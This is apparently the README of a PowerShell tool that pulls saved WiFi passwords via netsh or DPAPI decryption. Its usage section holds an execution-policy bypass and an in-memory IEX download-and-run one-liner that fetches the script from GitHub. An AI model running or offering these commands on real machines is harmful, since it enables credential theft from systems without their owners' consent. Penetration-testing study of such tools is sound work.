# Wi-Find
Wi-Find is a quick WiFi enumeration script that aims to pull saved WiFi passwords. It initially attempts to do this by invoking netsh commands. However, if a network interface is not available and you have NT AUTHORITY\SYSTEM access, then you read Window's WiFi configuration files by leveraging the UnProtect method and accessing DPAPI.

# Usage

Download Repo
```
git clone https://github.com/Har6ard/Wi-Find.git
cd Wi-Find
cmd > powershell -ExecutionPolicy bypass wiFind.ps1
```
Execute in Memory
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Har6ard/Wi-Find/refs/heads/main/wiFind.ps1')"
```
# Disclaimer
This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (Har6ard) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Har6ard's responsibility.
